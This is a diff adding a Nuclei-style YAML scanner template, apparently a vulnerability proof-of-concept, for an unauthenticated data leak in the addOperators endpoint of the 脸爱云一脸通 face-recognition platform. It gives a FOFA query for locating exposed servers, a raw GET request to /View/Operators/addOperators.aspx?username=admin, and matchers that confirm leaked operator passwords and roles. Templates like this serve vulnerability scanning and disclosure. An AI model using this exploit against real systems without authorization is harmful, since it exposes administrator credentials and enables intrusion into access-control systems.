@@ -1,0 +1,30 @@
+id: lianaiyun-face-platform-info-leak-addoperators
+
+info:
+  name: "脸爱云一脸通 addOperators 接口敏感数据泄露"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: body="View/UserReserved/UserReservedTest.aspx"
+          脸爱云一脸通智慧平台的 addOperators 接口未正确限制访问权限，导致系统敏感数据暴露。攻击者可通过构造特定请求获取服务器存储的凭证类信息及业务数据，存在数据泄露风险
+  tags: 脸爱云一脸通
+
+http:
+- raw:
+  - |
+    GET /View/Operators/addOperators.aspx?username=admin HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Language: zh-CN,zh;q=0.9
+    Upgrade-Insecure-Requests: 1
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'operatorPwd'
+  - type: word
+    part: body
+    words:
+    - 'operatorRole'
